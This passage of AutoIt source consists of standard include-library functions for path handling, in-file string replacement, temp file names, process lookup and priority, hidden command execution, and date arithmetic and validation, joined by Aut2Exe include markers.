; 	$szDrive - IN - Drive (Can be UNC).  If it's a drive letter, a : is automatically appended
; 	$szDir - IN - Directory.  A trailing slash is added if not found (No preceeding slash is added)
; 	$szFName - IN - The name of the file
; 	$szExt - IN - The file extension.  A period is supplied if not found in the extension
; Returns:
;	The string for the newly created path
; ===================================================================
Func _PathMake($szDrive, $szDir, $szFName, $szExt)
	; Format $szDrive, if it's not a UNC server name, then just get the drive letter and add a colon
	Local $szFullPath
	;
	If StringLen($szDrive) Then
		If Not (StringLeft($szDrive, 2) = "\\") Then $szDrive = StringLeft($szDrive, 1) & ":"
	EndIf

	; Format the directory by adding any necessary slashes
	If StringLen($szDir) Then
		If Not (StringRight($szDir, 1) = "\") And Not (StringRight($szDir, 1) = "/") Then $szDir = $szDir & "\"
	EndIf

	; Nothing to be done for the filename

	; Add the period to the extension if necessary
	If StringLen($szExt) Then
		If Not (StringLeft($szExt, 1) = ".") Then $szExt = "." & $szExt
	EndIf

	$szFullPath = $szDrive & $szDir & $szFName & $szExt
	Return $szFullPath
EndFunc   ;==>_PathMake

; ===================================================================
; Author: Valik
;
; _PathSplit($szPath, ByRef $szDrive, ByRef $szDir, ByRef $szFName, ByRef $szExt)
;
; Splits a path into the drive, directory, file name and file extension parts.  An empty string is set if a
;	part is missing.
; Parameters:
;	$szPath - IN - The path to be split (Can contain a UNC server or drive letter)
;	$szDrive - OUT - String to hold the drive
; 	$szDir - OUT - String to hold the directory
; 	$szFName - OUT - String to hold the file name
; 	$szExt - OUT - String to hold the file extension
; Returns:
;	Array with 5 elements where 0 = original path, 1 = drive, 2 = directory, 3 = filename, 4 = extension
; ===================================================================
Func _PathSplit($szPath, ByRef $szDrive, ByRef $szDir, ByRef $szFName, ByRef $szExt)
	; Set local strings to null (We use local strings in case one of the arguments is the same variable)
	Local $drive = ""
	Local $dir = ""
	Local $fname = ""
	Local $ext = ""
	Local $pos

	; Create an array which will be filled and returned later
	Local $array[5]
	$array[0] = $szPath; $szPath can get destroyed, so it needs set now

	; Get drive letter if present (Can be a UNC server)
	If StringMid($szPath, 2, 1) = ":" Then
		$drive = StringLeft($szPath, 2)
		$szPath = StringTrimLeft($szPath, 2)
	ElseIf StringLeft($szPath, 2) = "\\" Then
		$szPath = StringTrimLeft($szPath, 2) ; Trim the \\
		$pos = StringInStr($szPath, "\")
		If $pos = 0 Then $pos = StringInStr($szPath, "/")
		If $pos = 0 Then
			$drive = "\\" & $szPath; Prepend the \\ we stripped earlier
			$szPath = ""; Set to null because the whole path was just the UNC server name
		Else
			$drive = "\\" & StringLeft($szPath, $pos - 1) ; Prepend the \\ we stripped earlier
			$szPath = StringTrimLeft($szPath, $pos - 1)
		EndIf
	EndIf

	; Set the directory and file name if present
	Local $nPosForward = StringInStr($szPath, "/", 0, -1)
	Local $nPosBackward = StringInStr($szPath, "\", 0, -1)
	If $nPosForward >= $nPosBackward Then
		$pos = $nPosForward
	Else
		$pos = $nPosBackward
	EndIf
	$dir = StringLeft($szPath, $pos)
	$fname = StringRight($szPath, StringLen($szPath) - $pos)

	; If $szDir wasn't set, then the whole path must just be a file, so set the filename
	If StringLen($dir) = 0 Then $fname = $szPath

	$pos = StringInStr($fname, ".", 0, -1)
	If $pos Then
		$ext = StringRight($fname, StringLen($fname) - ($pos - 1))
		$fname = StringLeft($fname, $pos - 1)
	EndIf

	; Set the strings and array to what we found
	$szDrive = $drive
	$szDir = $dir
	$szFName = $fname
	$szExt = $ext
	$array[1] = $drive
	$array[2] = $dir
	$array[3] = $fname
	$array[4] = $ext
	Return $array
EndFunc   ;==>_PathSplit

; ===================================================================
; Author: Kurt (aka /dev/null) and JdeB
;
; _ReplaceStringInFile($szFileName, $szSearchString, $szReplaceString,$bCaseness = 0, $bOccurance = 0)
;
; Replaces a string ($szSearchString) with another string ($szReplaceString) the given TEXT file
; (via filename)
;
; Operation:
; The funnction opens the original file for reading and a temp file for writing. Then
; it reads in all lines and searches for the string. If it was found, the original line will be
; modified and written to the temp file. If the string was not found, the original line will be
; written to the temp file. At the end the original file will be deleted and the temp file will
; be renamed.
;
; Parameters:
; 	$szFileName 		name of the file to open.
;				ATTENTION !! Needs the FULL path, not just the name returned by eg. FileFindNextFile
; 	$szSearchString		The string we want to replace in the file
; 	$szReplaceString	The string we want as a replacement for $szSearchString
; 	$fCaseness		shall case matter?
;				0 = NO, case doe not matter (default), 1 = YES, case does matter
;	$fOccurance		shall we replace the string in every line or just the first occurance
;				0 = first only, 1 = ALL strings (default)
;
; Return Value(s):
;	On Success 		Returns the number of occurences of $szSearchString we found
;
;	On Failure 		Returns -1 sets @error
;					@error=1	Cannot open file
;					@error=2	Cannot open temp file
;					@error=3	Cannot write to temp file
;					@error=4	Cannot delete original file
;					@error=5	Cannot rename/move temp file
;
; ===================================================================
Func _ReplaceStringInFile($szFileName, $szSearchString, $szReplaceString, $fCaseness = 0, $fOccurance = 1)

	Local $iRetVal = 0
	Local $szTempFile, $hWriteHandle, $aFileLines, $nCount, $sEndsWith, $hFile
	;===============================================================================
	;== Read the file into an array
	;===============================================================================
	$hFile = FileOpen($szFileName, 0)
	If $hFile = -1 Then
		SetError(1)
		Return -1
	EndIf
	Local $s_TotFile = FileRead($hFile, FileGetSize($szFileName))
	If StringRight($s_TotFile, 2) = @CRLF Then
		$sEndsWith = @CRLF
	ElseIf StringRight($s_TotFile, 1) = @CR Then
		$sEndsWith = @CR
	ElseIf StringRight($s_TotFile, 1) = @LF Then
		$sEndsWith = @LF
	Else
		$sEndsWith = ""
	EndIf
	$aFileLines = StringSplit(StringStripCR($s_TotFile), @LF)
	FileClose($hFile)
	;===============================================================================
	;== Open the temporary file in write mode
	;===============================================================================
	$szTempFile = _TempFile()

	$hWriteHandle = FileOpen($szTempFile, 2)
	If $hWriteHandle = -1 Then
		SetError(2)
		Return -1
	EndIf
	;===============================================================================
	;== Loop through the array and search for $szSearchString
	;===============================================================================
	For $nCount = 1 To $aFileLines[0]
		If StringInStr($aFileLines[$nCount], $szSearchString, $fCaseness) Then
			$aFileLines[$nCount] = StringReplace($aFileLines[$nCount], $szSearchString, $szReplaceString, 1 - $fOccurance, $fCaseness)
			$iRetVal = $iRetVal + 1

			;======================================================================
			;== If we want just the first string replaced, copy the rest of the lines
			;== and stop
			;======================================================================
			If $fOccurance = 0 Then
				$iRetVal = 1
				ExitLoop
			EndIf
		EndIf
	Next
	;===============================================================================
	;== Write the lines to a temp file.
	;===============================================================================
	For $nCount = 1 To $aFileLines[0] - 1
		If FileWriteLine($hWriteHandle, $aFileLines[$nCount]) = 0 Then
			SetError(3)
			FileClose($hWriteHandle)
			Return -1
		EndIf
	Next
	; Write the last record and ensure it ends wit hthe same as the input file
	If $aFileLines[$nCount] <> "" Then FileWrite($hWriteHandle, $aFileLines[$nCount] & $sEndsWith)
	FileClose($hWriteHandle)

	;======================================================================
	;== Delete the original file
	;======================================================================
	If FileDelete($szFileName) = 0 Then
		SetError(4)
		Return -1
	EndIf

	;======================================================================
	;== Rename the temp file to the original file
	;======================================================================
	If FileMove($szTempFile, $szFileName) = 0 Then
		SetError(5)
		Return -1
	EndIf

	Return $iRetVal
EndFunc   ;==>_ReplaceStringInFile

;========================================================================================================
;
; Function Name:    _TempFile([s_DirectoryName],[s_FilePrefix], [s_FileExtension], [i_RandomLength)
; Description:      Generate a name for a temporary file. The file is guaranteed not to already exist.
; Parameter(s):
;     $s_DirectoryName    optional  Name of directory for filename, defaults to @TempDir
;     $s_FilePrefix       optional  File prefixname, defaults to "~"
;     $s_FileExtension    optional  File extenstion, defaults to ".tmp"
;     $i_RandomLength     optional  Number of characters to use to generate a unique name, defaults to 7
; Requirement(s):   None.
; Return Value(s):  Filename of a temporary file which does not exist.
; Author(s):        Dale (Klaatu) Thompson
;                   Hans Harder - Added Optional parameters
; Notes:            None.
;
;========================================================================================================
Func _TempFile($s_DirectoryName = @TempDir, $s_FilePrefix = "~", $s_FileExtension = ".tmp", $i_RandomLength = 7)
	Local $s_TempName
	; Check parameters
	If Not FileExists($s_DirectoryName) Then $s_DirectoryName = @TempDir   ; First reset to default temp dir
	If Not FileExists($s_DirectoryName) Then $s_DirectoryName = @ScriptDir ; Still wrong then set to Scriptdir
	; add trailing \ for directory name
	If StringRight($s_DirectoryName, 1) <> "\" Then $s_DirectoryName = $s_DirectoryName & "\"
	;
	Do
		$s_TempName = ""
		While StringLen($s_TempName) < $i_RandomLength
			$s_TempName = $s_TempName & Chr(Random(97, 122, 1))
		WEnd
		$s_TempName = $s_DirectoryName & $s_FilePrefix & $s_TempName & $s_FileExtension
	Until Not FileExists($s_TempName)

	Return ($s_TempName)
EndFunc   ;==>_TempFile

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\file.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\Process.au3>
; ----------------------------------------------------------------------------

; Include Version:1.59  (04/20/2006)
; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.0
; Language:       English
; Description:    Functions that assist with process management.
;
; ------------------------------------------------------------------------------

;===============================================================================
;
; Description -   Returns a string containing the process name that belongs to a given PID.
; Syntax -        _ProcessGetName( $iPID )
; Parameters -    $iPID - The PID of a currently running process
; Requirements -  None.
; Return Values - Success - The name of the process
;                 Failure - Blank string and sets @error
;                       1 - Process doesn't exist
;                       2 - Error getting process list
;                       3 - No processes found
; Author(s) -     Erifash <erifash [at] gmail [dot] com>, Wouter van Kesteren.
; Notes -         Supplementary to ProcessExists().
;===============================================================================
Func _ProcessGetName($i_PID)
	If Not ProcessExists($i_PID) Then
		SetError(1)
		Return ''
	EndIf
	Local $a_Processes = ProcessList()
	If Not @error Then
		For $i = 1 To $a_Processes[0][0]
			If $a_Processes[$i][1] = $i_PID Then Return $a_Processes[$i][0]
		Next
	EndIf
	SetError(1)
	Return ''
EndFunc   ;==>_ProcessGetName

;===============================================================================
;
; Function Name:    _ProcessGetPriority()
; Description:      Get the  priority of an open process
; Parameter(s):     $vProcess      - PID or name of a process.
; Requirement(s):   AutoIt Beta v3.1.1.61+
;                   kernel32.dll (included with Windows)
; Return Value(s):  On Success - Returns integer corressponding to
;                   the processes's priority:
;                     0 - Idle/Low
;                     1 - Below Normal (Not supported on Windows 95/98/ME)
;                     2 - Normal
;                     3 - Above Normal (Not supported on Windows 95/98/ME)
;                     4 - High
;                     5 - Realtime
; On Failure:       Returns -1 and sets @Error to 1
; Author(s):        Matthew Tucker
;                   Valik added Pid or Processname logic
;===============================================================================
;
Func _ProcessGetPriority($vProcess)
	Local $i_PID = ProcessExists($vProcess)
	If Not $i_PID Then
		SetError(1)
		Return -1
	EndIf
	Local $hDLL = DllOpen('kernel32.dll')
	Local $aProcessHandle = DllCall($hDLL, 'int', 'OpenProcess', 'int', 0x0400, 'int', False, 'int', $i_PID)
	Local $aPriority = DllCall($hDLL, 'int', 'GetPriorityClass', 'int', $aProcessHandle[0])
	DllCall($hDLL, 'int', 'CloseHandle', 'int', $aProcessHandle[0])
	DllClose($hDLL)
	Switch $aPriority[0]
		Case 0x00000040
			Return 0
		Case 0x00004000
			Return 1
		Case 0x00000020
			Return 2
		Case 0x00008000
			Return 3
		Case 0x00000080
			Return 4
		Case 0x00000100
			Return 5
		Case Else
			SetError(1)
			Return -1
	EndSwitch

EndFunc   ;==>_ProcessGetPriority

;===============================================================================
;
; Description:      Executes a DOS command in a hidden command window.
; Syntax:           _RunDOS( $sCommand )
; Parameter(s):     $sCommand - Command to execute
; Requirement(s):   None
; Return Value(s):  On Success - Returns the exit code of the command
;                   On Failure - Depends on RunErrorsFatal setting
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _RunDOS($sCommand)
	Return RunWait(@ComSpec & " /C " & $sCommand, "", @SW_HIDE)
EndFunc   ;==>_RunDOS

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\Process.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\Date.au3>
; ----------------------------------------------------------------------------

;
; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.0
; Language:       English
; Description:    Functions that assist with dates and times.
;
;===============================================================================
;
; Description:      Calculates a new date based on a given date and add an interval.
; Parameter(s):     $sType    D = Add number of days to the given date
;                             M = Add number of months to the given date
;                             Y = Add number of years to the given date
;                             w = Add number of Weeks to the given date
;                             h = Add number of hours to the given date
;                             n = Add number of minutes to the given date
;                             s = Add number of seconds to the given date
;                   $iValToAdd - number to be added
;                   $sDate    - Input date in the format YYYY/MM/DD[ HH:MM:SS]
; Requirement(s):   None
; Return Value(s):  On Success - Date newly calculated date.
;                   On Failure - 0  and Set
;                                   @ERROR to:  1 - Invalid $sType
;                                                  2 - Invalid $iValToAdd
;                                                  3 - Invalid $sDate
; Author(s):        Jos van der Zande
; Note(s):          The function will not return an invalid date.
;                   When 3 months is are to '2004/1/31' then the result will be 2004/04/30
;
;
;===============================================================================
Func _DateAdd($sType, $iValToAdd, $sDate)
	Local $asTimePart[4]
	Local $asDatePart[4]
	Local $iJulianDate
	Local $iTimeVal
	Local $iNumDays
	Local $Day2Add
	; Verify that $sType is Valid
	$sType = StringLeft($sType, 1)
	If StringInStr("D,M,Y,w,h,n,s", $sType) = 0 Or $sType = "" Then
		SetError(1)
		Return (0)
	EndIf
	; Verify that Value to Add  is Valid
	If Not StringIsInt($iValToAdd) Then
		SetError(2)
		Return (0)
	EndIf
	; Verify If InputDate is valid
	If Not _DateIsValid($sDate) Then
		SetError(3)
		Return (0)
	EndIf
	; split the date and time into arrays
	_DateTimeSplit($sDate, $asDatePart, $asTimePart)

	; ====================================================
	; adding days then get the julian date
	; add the number of day
	; and convert back to Gregorian
	If $sType = "d" Or $sType = "w" Then
		If $sType = "w" Then $iValToAdd = $iValToAdd * 7
		$iJulianDate = _DateToDayValue($asDatePart[1], $asDatePart[2], $asDatePart[3]) + $iValToAdd
		_DayValueToDate($iJulianDate, $asDatePart[1], $asDatePart[2], $asDatePart[3])
	EndIf
	; ====================================================
	; adding Months
	If $sType = "m" Then
		$asDatePart[2] = $asDatePart[2] + $iValToAdd
		; pos number of months
		While $asDatePart[2] > 12
			$asDatePart[2] = $asDatePart[2] - 12
			$asDatePart[1] = $asDatePart[1] + 1
		WEnd
		; Neg number of months
		While $asDatePart[2] < 1
			$asDatePart[2] = $asDatePart[2] + 12
			$asDatePart[1] = $asDatePart[1] - 1
		WEnd
	EndIf
	; ====================================================
	; adding Years
	If $sType = "y" Then
		$asDatePart[1] = $asDatePart[1] + $iValToAdd
	EndIf
	; ====================================================
	; adding Time value
	If $sType = "h" Or $sType = "n" Or $sType = "s" Then
		$iTimeVal = _TimeToTicks($asTimePart[1], $asTimePart[2], $asTimePart[3]) / 1000
		If $sType = "h" Then $iTimeVal = $iTimeVal + $iValToAdd * 3600
		If $sType = "n" Then $iTimeVal = $iTimeVal + $iValToAdd * 60
		If $sType = "s" Then $iTimeVal = $iTimeVal + $iValToAdd
		; calculated days to add
		$Day2Add = Int($iTimeVal/ (24 * 60 * 60))
		$iTimeVal = $iTimeVal - $Day2Add * 24 * 60 * 60
		If $iTimeVal < 0 Then
			$Day2Add = $Day2Add - 1
			$iTimeVal = $iTimeVal + 24 * 60 * 60
		EndIf
		$iJulianDate = _DateToDayValue($asDatePart[1], $asDatePart[2], $asDatePart[3]) + $Day2Add
		; calculate the julian back to date
		_DayValueToDate($iJulianDate, $asDatePart[1], $asDatePart[2], $asDatePart[3])
		; caluculate the new time
		_TicksToTime($iTimeVal * 1000, $asTimePart[1], $asTimePart[2], $asTimePart[3])
	EndIf
	; ====================================================
	; check if the Input day is Greater then the new month last day.
	; if so then change it to the last possible day in the month
	$iNumDays = StringSplit('31,28,31,30,31,30,31,31,30,31,30,31', ',')
	If _DateIsLeapYear($asDatePart[1]) Then $iNumDays[2] = 29
	;
	If $iNumDays[$asDatePart[2]] < $asDatePart[3] Then $asDatePart[3] = $iNumDays[$asDatePart[2]]
	; ========================
	; Format the return date
	; ========================
	; Format the return date
	$sDate = $asDatePart[1] & '/' & StringRight("0" & $asDatePart[2], 2) & '/' & StringRight("0" & $asDatePart[3], 2)
	; add the time when specified in the input
	If $asTimePart[0] > 0 Then
		If $asTimePart[0] > 2 Then
			$sDate = $sDate & " " & StringRight("0" & $asTimePart[1], 2) & ':' & StringRight("0" & $asTimePart[2], 2) & ':' & StringRight("0" & $asTimePart[3], 2)
		Else
			$sDate = $sDate & " " & StringRight("0" & $asTimePart[1], 2) & ':' & StringRight("0" & $asTimePart[2], 2)
		EndIf
	EndIf
	;
	return ($sDate)
EndFunc   ;==>_DateAdd

;===============================================================================
;
; Description:      Returns the name of the weekday, based on the specified day.
; Parameter(s):     $iDayNum - Day number
;                   $iShort  - Format:
;                              0 = Long name of the weekday
;                              1 = Abbreviated name of the weekday
; Requirement(s):   None
; Return Value(s):  On Success - Weekday name
;                   On Failure - A NULL string and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          English only
;
;===============================================================================
Func _DateDayOfWeek($iDayNum, $iShort = 0)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $aDayOfWeek[8]

	$aDayOfWeek[1] = "Sunday"
	$aDayOfWeek[2] = "Monday"
	$aDayOfWeek[3] = "Tuesday"
	$aDayOfWeek[4] = "Wednesday"
	$aDayOfWeek[5] = "Thursday"
	$aDayOfWeek[6] = "Friday"
	$aDayOfWeek[7] = "Saturday"
	Select
		Case Not StringIsInt($iDayNum) Or Not StringIsInt($iShort)
			SetError(1)
			Return ""
		Case $iDayNum < 1 Or $iDayNum > 7
			SetError(1)
			Return ""
		Case Else
			Select
				Case $iShort = 0
					Return $aDayOfWeek[$iDayNum]
				Case $iShort = 1
					Return StringLeft($aDayOfWeek[$iDayNum], 3)
				Case Else
					SetError(1)
					Return ""
			EndSelect
	EndSelect
EndFunc   ;==>_DateDayOfWeek

;===============================================================================
;
; Function Name:  _DateDaysInMonth()
; Description:    Returns the number of days in a month, based on the specified
;                 month and year.
; Author(s):      Jeremy Landes <jlandes at landeserve dot com>
;
;===============================================================================
Func _DateDaysInMonth($iYear, $iMonthNum)
	Local $aiNumDays
	$aiNumDays = "31,28,31,30,31,30,31,31,30,31,30,31"
	$aiNumDays = StringSplit($aiNumDays, ",")
	If _DateIsMonth($iMonthNum) And _DateIsYear($iYear) Then
		If _DateIsLeapYear($iYear) Then $aiNumDays[2] = $aiNumDays[2] + 1
		SetError(0)
		Return $aiNumDays[$iMonthNum]
	Else
		SetError(1)
		Return 0
	EndIf
EndFunc   ;==>_DateDaysInMonth

;===============================================================================
;
; Description:      Returns the difference between 2 dates, expressed in the type requested
; Parameter(s):     $sType - returns the difference in:
;                               d = days
;                               m = Months
;                               y = Years
;                               w = Weeks
;                               h = Hours
;                               n = Minutes
;                               s = Seconds
;                   $sStartDate    - Input Start date in the format "YYYY/MM/DD[ HH:MM:SS]"
;                   $sEndDate    - Input End date in the format "YYYY/MM/DD[ HH:MM:SS]"
; Requirement(s):   None
; Return Value(s):  On Success - Difference between the 2 dates
;                   On Failure - 0  and Set
;                                   @ERROR to:  1 - Invalid $sType
;                                               2 - Invalid $sStartDate
;                                               3 - Invalid $sEndDate
; Author(s):        Jos van der Zande
; Note(s):
;
;===============================================================================
Func _DateDiff($sType, $sStartDate, $sEndDate)
	Local $asStartDatePart[4]
	Local $asStartTimePart[4]
	Local $asEndDatePart[4]
	Local $asEndTimePart[4]
	Local $iTimeDiff
	Local $iYearDiff
	Local $iMonthDiff
	Local $iStartTimeInSecs
	Local $iEndTimeInSecs
	Local $aDaysDiff
	;
	; Verify that $sType is Valid
	$sType = StringLeft($sType, 1)
	If StringInStr("d,m,y,w,h,n,s", $sType) = 0 Or $sType = "" Then
		SetError(1)
		Return (0)
	EndIf
	; Verify If StartDate is valid
	If Not _DateIsValid($sStartDate) Then
		SetError(2)
		Return (0)
	EndIf
	; Verify If EndDate is valid
	If Not _DateIsValid($sEndDate) Then
		SetError(3)
		Return (0)
	EndIf
	; split the StartDate and Time into arrays
	_DateTimeSplit($sStartDate, $asStartDatePart, $asStartTimePart)
	; split the End  Date and time into arrays
	_DateTimeSplit($sEndDate, $asEndDatePart, $asEndTimePart)
	; ====================================================
	; Get the differens in days between the 2 dates
	$aDaysDiff = _DateToDayValue($asEndDatePart[1], $asEndDatePart[2], $asEndDatePart[3]) - _DateToDayValue($asStartDatePart[1], $asStartDatePart[2], $asStartDatePart[3])
	; ====================================================
	; Get the differens in Seconds between the 2 times when specified
	If $asStartTimePart[0] > 1 And $asEndTimePart[0] > 1 Then
		$iStartTimeInSecs = $asStartTimePart[1] * 3600 + $asStartTimePart[2] * 60 + $asStartTimePart[3]
		$iEndTimeInSecs = $asEndTimePart[1] * 3600 + $asEndTimePart[2] * 60 + $asEndTimePart[3]
		$iTimeDiff = $iEndTimeInSecs - $iStartTimeInSecs
		If $iTimeDiff < 0 Then
			$aDaysDiff = $aDaysDiff - 1
			$iTimeDiff = $iTimeDiff + 24 * 60 * 60
		EndIf
	Else
		$iTimeDiff = 0
	EndIf
	Select
		Case $sType = "d"
			Return ($aDaysDiff)
		Case $sType = "m"
			$iYearDiff = $asEndDatePart[1] - $asStartDatePart[1]
			$iMonthDiff = $asEndDatePart[2] - $asStartDatePart[2] + $iYearDiff * 12
			If $asEndDatePart[3] < $asStartDatePart[3] Then $iMonthDiff = $iMonthDiff - 1
			$iStartTimeInSecs = $asStartTimePart[1] * 3600 + $asStartTimePart[2] * 60 + $asStartTimePart[3]
			$iEndTimeInSecs = $asEndTimePart[1] * 3600 + $asEndTimePart[2] * 60 + $asEndTimePart[3]
			$iTimeDiff = $iEndTimeInSecs - $iStartTimeInSecs
			If $asEndDatePart[3] = $asStartDatePart[3] And $iTimeDiff < 0 Then $iMonthDiff = $iMonthDiff - 1
			Return ($iMonthDiff)
		Case $sType = "y"
			$iYearDiff = $asEndDatePart[1] - $asStartDatePart[1]
			If $asEndDatePart[2] < $asStartDatePart[2] Then $iYearDiff = $iYearDiff - 1
			If $asEndDatePart[2] = $asStartDatePart[2] And $asEndDatePart[3] < $asStartDatePart[3] Then $iYearDiff = $iYearDiff - 1
			$iStartTimeInSecs = $asStartTimePart[1] * 3600 + $asStartTimePart[2] * 60 + $asStartTimePart[3]
			$iEndTimeInSecs = $asEndTimePart[1] * 3600 + $asEndTimePart[2] * 60 + $asEndTimePart[3]
			$iTimeDiff = $iEndTimeInSecs - $iStartTimeInSecs
			If $asEndDatePart[2] = $asStartDatePart[2] And $asEndDatePart[3] = $asStartDatePart[3] And $iTimeDiff < 0 Then $iYearDiff = $iYearDiff - 1
			Return ($iYearDiff)
		Case $sType = "w"
			Return (Int($aDaysDiff / 7))
		Case $sType = "h"
			Return ($aDaysDiff * 24 + Int($iTimeDiff / 3600))
		Case $sType = "n"
			Return ($aDaysDiff * 24 * 60 + Int($iTimeDiff / 60))
		Case $sType = "s"
			Return ($aDaysDiff * 24 * 60 * 60 + $iTimeDiff)
	EndSelect
EndFunc   ;==>_DateDiff

;===============================================================================
;
; Description:      Returns 1 if the specified year falls on a leap year and
;                   returns 0 if it does not.
; Parameter(s):     $iYear - Year to check
; Requirement(s):   None
; Return Value(s):  On Success - 0 = Year is not a leap year
;                                1 = Year is a leap year
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateIsLeapYear($iYear)
	If StringIsInt($iYear) Then
		Select
			Case Mod($iYear, 4) = 0 And Mod($iYear, 100) <> 0
				Return 1
			Case Mod($iYear, 400) = 0
				Return 1
			Case Else
				Return 0
		EndSelect
	Else
		SetError(1)
		Return 0
	EndIf
EndFunc   ;==>_DateIsLeapYear

;===============================================================================
;
; Function Name:  _DateIsMonth()
; Description:    Checks a given number to see if it is a valid month.
; Author(s):      Jeremy Landes <jlandes at landeserve dot com>
;
;===============================================================================
Func _DateIsMonth($iNumber)
	If StringIsInt($iNumber) Then
		If $iNumber >= 1 And $iNumber <= 12 Then
			Return 1
		Else
			Return 0
		EndIf
	Else
		Return 0
	EndIf
EndFunc   ;==>_DateIsMonth

;===============================================================================
;
; Description:      Verify if date and time are valid "yyyy/mm/dd[ hh:mm[:ss]]".
; Parameter(s):     $sDate format "yyyy/mm/dd[ hh:mm[:ss]]"
; Requirement(s):   None
; Return Value(s):  On Success - 1
;                   On Failure - 0
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
;                   Jos van der Zande <jdeb at autoitscript dot com>
; Note(s):          None
;
;===============================================================================
Func _DateIsValid($sDate)
	Local $asDatePart[4]
	Local $asTimePart[4]
	Local $iNumDays
	$iNumDays = "31,28,31,30,31,30,31,31,30,31,30,31"
	$iNumDays = StringSplit($iNumDays, ",")
	; split the date and time into arrays
	_DateTimeSplit($sDate, $asDatePart, $asTimePart)
	If $asDatePart[0] <> 3 Then
		Return (0)
	EndIf
	; verify valid input date values
	If _DateIsLeapYear($asDatePart[1]) Then $iNumDays[2] = 29
	If $asDatePart[1] < 1000 Or $asDatePart[1] > 2999 Then Return (0)
	If $asDatePart[2] < 1 Or $asDatePart[2] > 12 Then Return (0)
	If $asDatePart[3] < 1 Or $asDatePart[3] > $iNumDays[$asDatePart[2]] Then Return (0)

	; verify valid input Time values
	If $asTimePart[0] < 1 Then Return (1)    ; No time specified so date must be correct
	If $asTimePart[0] < 2 Then Return (0)    ; need at least HH:MM when something is specified
	If $asTimePart[1] < 0 Or $asTimePart[1] > 23 Then Return (0)
	If $asTimePart[2] < 0 Or $asTimePart[2] > 59 Then Return (0)
	If $asTimePart[3] < 0 Or $asTimePart[3] > 59 Then Return (0)
	; we got here so date/time must be good
	Return (1)
EndFunc   ;==>_DateIsValid

;===============================================================================
;
; Function Name:  _DateIsYear()
; Description:    Checks a given number to see if it is a valid year.
; Author(s):      Jeremy Landes <jlandes at landeserve dot com>
;
;===============================================================================
Func _DateIsYear($iNumber)
	If StringIsInt($iNumber) Then
		If StringLen($iNumber) = 4 Then
			Return 1
		Else
			Return 0
		EndIf
	Else
		Return 0
	EndIf
EndFunc   ;==>_DateIsYear

;===============================================================================
;
; Description:      Returns previous weekday number, based on the specified day
;                   of the week.
; Parameter(s):     $iWeekdayNum - Weekday number
; Requirement(s):   None
; Return Value(s):  On Success - Previous weekday number
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateLastWeekdayNum($iWeekdayNum)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iLastWeekdayNum

	Select
		Case Not StringIsInt($iWeekdayNum)
			SetError(1)
			Return 0
		Case $iWeekdayNum < 1 Or $iWeekdayNum > 7
			SetError(1)
			Return 0
		Case Else
			If $iWeekdayNum = 1 Then
				$iLastWeekdayNum = 7
			Else
				$iLastWeekdayNum = $iWeekdayNum - 1
			EndIf

			Return $iLastWeekdayNum
	EndSelect
EndFunc   ;==>_DateLastWeekdayNum

;===============================================================================
;
; Description:      Returns previous month number, based on the specified month.
; Parameter(s):     $iMonthNum - Month number
; Requirement(s):   None
; Return Value(s):  On Success - Previous month number
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateLastMonthNum($iMonthNum)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iLastMonthNum

	Select
		Case Not StringIsInt($iMonthNum)
			SetError(1)
			Return 0
		Case $iMonthNum < 1 Or $iMonthNum > 12
			SetError(1)
			Return 0
		Case Else
			If $iMonthNum = 1 Then
				$iLastMonthNum = 12
			Else
				$iLastMonthNum = $iMonthNum - 1
			EndIf

			$iLastMonthNum = StringFormat( "%02d", $iLastMonthNum)
			Return $iLastMonthNum
	EndSelect
EndFunc   ;==>_DateLastMonthNum

;===============================================================================
;
; Description:      Returns previous month's year, based on the specified month
;                   and year.
; Parameter(s):     $iMonthNum - Month number
;                   $iYear     - Year
; Requirement(s):   None
; Return Value(s):  On Success - Previous month's year
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateLastMonthYear($iMonthNum, $iYear)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iLastYear

	Select
		Case Not StringIsInt($iMonthNum) Or Not StringIsInt($iYear)
			SetError(1)
			Return 0
		Case $iMonthNum < 1 Or $iMonthNum > 12
			SetError(1)
			Return 0
		Case Else
			If $iMonthNum = 1 Then
				$iLastYear = $iYear - 1
			Else
				$iLastYear = $iYear
			EndIf

			$iLastYear = StringFormat( "%04d", $iLastYear)
			Return $iLastYear
	EndSelect
EndFunc   ;==>_DateLastMonthYear

;===============================================================================
;
; Description:      Returns the name of the month, based on the specified month.
; Parameter(s):     $iMonthNum - Month number
;                   $iShort    - Format:
;                                0 = Long name of the month
;                                1 = Abbreviated name of the month
; Requirement(s):   None
; Return Value(s):  On Success - Month name
;                   On Failure - A NULL string and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          English only
;
;===============================================================================
Func _DateMonthOfYear($iMonthNum, $iShort)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $aMonthOfYear[13]

	$aMonthOfYear[1] = "January"
	$aMonthOfYear[2] = "February"
	$aMonthOfYear[3] = "March"
	$aMonthOfYear[4] = "April"
